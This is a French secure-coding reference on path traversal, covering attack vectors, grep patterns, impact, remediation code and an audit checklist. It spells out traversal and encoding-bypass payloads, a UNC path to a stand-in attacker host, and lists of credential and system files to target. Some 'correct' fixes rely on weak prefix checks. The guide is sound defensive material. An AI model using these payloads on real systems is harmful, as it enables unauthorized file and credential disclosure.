# Path Traversal (Directory Traversal)

## Définition

Accès non autorisé à des fichiers et répertoires en dehors du dossier prévu, via manipulation de chemins de fichiers.

## Sévérité

🔴 **CRITIQUE** - Lecture de fichiers sensibles, exécution de code

## Principe de l'Attaque

```
Input: ../../etc/passwd
Path: /var/www/files/../../etc/passwd
Résultat: /etc/passwd
→ Accès fichier hors du dossier autorisé
```

## Vecteurs d'Attaque

### Basic Traversal
```
../../../etc/passwd
..\..\..\..\windows\system32\config\sam
```

### Absolute Path
```
/etc/passwd
C:\Windows\System32\config\sam
```

### URL Encoding
```
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd (double encoding)
```

### Null Byte Injection
```
../../etc/passwd%00.jpg
(bypass extension check)
```

### Nested Traversal
```
....//....//....//etc/passwd
..././..././..././etc/passwd
```

### UNC Share (Windows)
```
\\attacker.com\share\malicious.exe
```

## Localisation dans le Code

### À Chercher

#### File Operations
- Download endpoints
- File viewer/reader
- Image/document serving
- Template loading
- Include/require
- Log file access

#### User-Controlled Paths
- Filename parameters
- Path parameters
- Template names
- Language/locale files
- Theme/skin files

### Patterns Vulnérables

```
Concaténation dangereuse :
- path.join(baseDir, req.params.filename)
- "/files/" + req.query.file
- File(baseDir + "/" + userInput)
- include($_GET['page'] . ".php")
- res.sendFile(req.params.path)
```

### Patterns à Grep

```
Rechercher :
- "sendFile.*req\."
- "readFile.*params\."
- "path\.join.*req\."
- "File\(.*\+.*req"
- "include.*\$_GET"
- "require.*\$_REQUEST"
- "open\(.*user"
```

## Impact

### File Disclosure
- /etc/passwd, /etc/shadow
- Configuration files
- Source code
- Database credentials
- Private keys (.ssh/id_rsa)
- .env files

### Code Execution
- Upload puis include
- Log poisoning
- Template injection

### Information Disclosure
- Application structure
- Technology stack
- User enumeration

## Remédiation

### 1. Validation Stricte (Whitelist)

**Liste Fermée**
```
✅ CORRECT :
const allowedFiles = ['file1.pdf', 'file2.pdf', 'doc3.txt']
if (!allowedFiles.includes(req.params.filename))
  throw new Error('File not allowed')
```

**ID Mapping**
```
✅ CORRECT :
const fileMap = {
  '1': 'public/file1.pdf',
  '2': 'public/file2.pdf'
}
const filePath = fileMap[req.params.id]
if (!filePath)
  throw new Error('File not found')
```

### 2. Path Normalization et Validation

**Résolution de Path**
```
✅ CORRECT (Node.js) :
const path = require('path')
const baseDir = '/var/www/files'

const requestedPath = path.normalize(req.params.file)
const fullPath = path.resolve(baseDir, requestedPath)

// Vérifier que le path final est dans baseDir
if (!fullPath.startsWith(baseDir))
  throw new Error('Access denied')
```

**Résolution de Path (Python)**
```
✅ CORRECT :
import os
base_dir = '/var/www/files'

requested_file = request.args.get('file')
full_path = os.path.realpath(os.path.join(base_dir, requested_file))

if not full_path.startswith(base_dir):
    raise Exception('Access denied')
```

### 3. Sanitization

**Supprimer Séquences Dangereuses**
```
✅ CORRECT :
function sanitizePath(filename) {
  // Supprimer ../ et ..\
  filename = filename.replace(/\.\./g, '')
  // Supprimer path separators au début
  filename = filename.replace(/^[\/\\]+/, '')
  // Supprimer absolute paths
  filename = filename.replace(/^[a-zA-Z]:/, '')
  return filename
}
```

**Attention**
- Sanitization seule insuffisante
- Bypass possibles (nested, encoding)
- Toujours valider après sanitization

### 4. Chroot/Jail

**Isolation**
- Chroot jail
- Container filesystem isolation
- Restricted user permissions

### 5. Éviter User Input dans Paths

**Design Alternatif**
```
✅ CORRECT :
// ID numérique plutôt que filename
GET /files/123

// Mapping côté serveur
const file = database.getFileById(123)
if (file && userHasAccess(user, file))
  sendFile(file.path)
```

### 6. Filesystem Permissions

**Least Privilege**
- Application user avec permissions minimales
- Read-only sur fichiers publics
- Pas d'accès aux fichiers système
- Séparation des répertoires

### 7. Validation d'Extension

**Si Extensions Autorisées**
```
✅ CORRECT :
const allowedExtensions = ['.pdf', '.jpg', '.png']
const ext = path.extname(filename).toLowerCase()
if (!allowedExtensions.includes(ext))
  throw new Error('Invalid file type')
```

## Checklist d'Audit

### Recherche de Vulnérabilités
- [ ] User input dans chemins de fichiers ?
- [ ] Concaténation de paths ?
- [ ] Pas de validation de path ?
- [ ] Pas de vérification que path reste dans baseDir ?
- [ ] Include/require avec user input ?
- [ ] sendFile avec user input ?

### Validation des Correctifs
- [ ] Whitelist de fichiers autorisés ?
- [ ] ID mapping utilisé ?
- [ ] Path normalization + validation ?
- [ ] Vérification startsWith baseDir ?
- [ ] Sanitization appliquée ?
- [ ] Filesystem permissions restrictives ?

### Tests de Vulnérabilité
- [ ] Tester ../../../etc/passwd ?
- [ ] Tester avec URL encoding ?
- [ ] Tester avec null byte ?
- [ ] Tester absolute paths ?
- [ ] Tester nested traversal ?

## Fichiers Cibles

### Linux/Unix
```
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log
/root/.ssh/id_rsa
/home/user/.bash_history
```

### Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\boot.ini
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

### Application
```
.env
config/database.yml
config/secrets.json
.git/config
.htaccess
```

## Techniques de Bypass

### Encodage
```
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252Fetc%252Fpasswd (double)
..%c0%af..%c0%afetc%c0%afpasswd
```

### Nested Patterns
```
....//....//etc/passwd
..;/..;/etc/passwd
```

### Null Byte
```
../../etc/passwd%00.jpg
(PHP < 5.3)
```

### Case Variation
```
..\/..\/..\/etc/passwd
```

## Code Sécurisé

### Node.js
```
✅ CORRECT :
const path = require('path')
const baseDir = path.resolve('/var/www/public')

function serveFile(filename) {
  // Normaliser
  const safePath = path.normalize(filename).replace(/^(\.\.[\/\\])+/, '')
  const fullPath = path.resolve(baseDir, safePath)

  // Vérifier dans baseDir
  if (!fullPath.startsWith(baseDir))
    throw new Error('Access denied')

  return fs.readFile(fullPath)
}
```

### Python
```
✅ CORRECT :
import os
BASE_DIR = '/var/www/public'

def serve_file(filename):
    # Résoudre path complet
    safe_path = os.path.normpath(filename).lstrip('/')
    full_path = os.path.realpath(os.path.join(BASE_DIR, safe_path))

    # Vérifier dans BASE_DIR
    if not full_path.startswith(BASE_DIR):
        raise ValueError('Access denied')

    return open(full_path, 'rb').read()
```

### Java
```
✅ CORRECT :
File baseDir = new File("/var/www/public").getCanonicalFile()
File requestedFile = new File(baseDir, userInput).getCanonicalFile()

if (!requestedFile.getPath().startsWith(baseDir.getPath()))
    throw new SecurityException("Access denied")
```

## Références

- **OWASP** : Path Traversal
- **CWE-22** : Improper Limitation of a Pathname to a Restricted Directory
- **CWE-73** : External Control of File Name or Path
